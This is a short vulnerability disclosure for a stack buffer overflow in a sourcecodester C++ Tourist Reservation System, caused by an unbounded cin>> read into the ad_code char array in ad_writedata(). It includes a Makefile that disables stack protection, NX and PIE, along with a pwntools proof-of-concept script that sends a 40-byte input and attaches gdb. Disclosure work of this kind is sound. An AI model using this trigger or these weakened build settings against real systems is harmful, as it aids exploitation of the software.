# Tourist Reservation System using C++ with Free Source Code v1.0 - Buffer Overflow

Supplier:https://www.sourcecodester.com/cc/15022/tourist-reservation-system-using-c-free-source-code.html

There is a variable of type char called ad_code in Tourist Reservation System.cpp, which receives data in the form of cin>>, resulting in the ability to write ad_code data of any length and causing a buffer overflow.
![4](/img/Tourist-Reservation-System-using-C++-with-Free-Source-Code/4.png)

Vulnerability location: Line 87 in Tourist Reservation System.cpp file and exists in the ad_writedata() function.

![1](/img/Tourist-Reservation-System-using-C++-with-Free-Source-Code/1.png)

To execute the ad_writedata() function, you must enter the enter key while the program is running, and then enter 1 (select 1) ADMIN, then enter 1 (select 1) New trips until prompted for Enter Your Option.

![2](/img/Tourist-Reservation-System-using-C++-with-Free-Source-Code/2.png)

Note: I used g++ from Ubuntu to compile this project. I replaced all irrelevant system("cls"); in the source code with system("clear"); because cls does not work in Linux and can cause program exceptions.

I have written the following Makefile file to compile the program using make:

```Makefile
CXX=g++
CXXFLAGS=-Wall -Wextra -std=c++11 -fno-stack-protector -z execstack -no-pie

SRCS=main.cpp
OBJS=$(SRCS:.cpp=.o)
EXEC=main

.PHONY: all clean

all: $(EXEC)

$(EXEC): $(OBJS)
	$(CXX) $(CXXFLAGS) $(OBJS) -o $(EXEC)

%.o: %.cpp
	$(CXX) $(CXXFLAGS) -c $< -o $@

clean:
	rm -f $(OBJS) $(EXEC)

```

![3](/img/Tourist-Reservation-System-using-C++-with-Free-Source-Code/3.png)

Trigger vulnerability: When the input length is greater than 20 bytes, use gdb to debug the program and check the content of the ad_code variable to find that the length is greater than 20 bytes, successfully exceeding the variable definition length!

![6](/img/Tourist-Reservation-System-using-C++-with-Free-Source-Code/6.png)

Note: Due to the location where GDB debugging is triggered, the location of the ad_code variable is the rsp address+18C after running the script.

![5](/img/Tourist-Reservation-System-using-C++-with-Free-Source-Code/5.png)

pwn-attack.py

```python
from pwn import *

p = process('/home/xxxxxxxxxxxx/main')

p.sendlineafter('                                     \t      PRESS ENTER TO CONTINUE....', '')
p.sendlineafter('Enter any other key for exit\n\n\n', '1')
p.sendlineafter('Enter Your Option\n', '1')

payload = b'F' * 40

p.sendlineafter('Enter the Destination Code\nD-', payload)

print("[+] Payload: ", payload)

gdb.attach(p)

p.interactive()
```

This has ended.